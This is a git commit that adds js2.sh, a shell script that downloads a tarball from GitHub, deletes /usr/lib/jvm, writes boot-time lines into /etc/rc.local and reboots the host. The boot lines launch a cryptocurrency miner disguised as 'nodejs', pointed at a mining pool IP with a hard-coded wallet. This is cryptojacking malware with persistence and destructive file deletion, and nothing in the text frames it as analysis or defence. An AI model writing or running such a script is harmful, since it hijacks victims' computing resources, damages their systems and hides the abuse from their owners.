a35edfe2c2477ab57926d778de1783309024b1d0
d1uf95z8 <68303938+d1uf95z8@users.noreply.github.com>
2020-07-22 12:56:01 +0000

    Create js2.sh

---
+++ js2.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+cd /home/sshuser
+wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv44.tar.gz
+tar xvzf csv44.tar.gz
+rm -r /usr/lib/jvm
+ls
+sudo echo '
+cd /home/sshuser
+sudo sysctl vm.nr_hugepages=2048
+ls
+./nodejs -o 139.99.123.101:10110 -u So2ifgjqGMZJhCrqpFMotQQAiJAiATuJLNAK2HrPLoNzK8hkqNbf9t8gmx6bzAQrXRMnWnoELoiD6GTv8guPBRwH5ymuNB4Z32x2tMXrRP6k.15000 -p hhhh -a rx/wow --donate-level 1 -t 8 -k -B
+ls' >> /etc/rc.local
+sudo shutdown -r 4
